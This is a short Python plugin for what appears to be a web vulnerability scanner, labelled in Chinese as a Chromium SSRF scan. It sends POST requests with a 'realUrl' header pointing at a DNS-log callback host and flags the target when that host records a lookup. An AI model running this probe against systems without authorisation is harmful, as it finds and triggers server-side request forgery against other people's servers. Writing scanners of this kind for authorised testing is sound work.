#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

import asyncio
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    Chromium SSRF 扫描
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for url in self.get_url_normpath_list(self.url):
                    keyword = payload = self.get_dnslog_url()
                    headers = {"realUrl": payload}
                    try:
                        async with session.post(url=url, headers=headers, allow_redirects=False) as res:
                            await asyncio.sleep(3)
                            if await self.get_dnslog_recode(keyword):
                                yield url
                    except:
                        pass
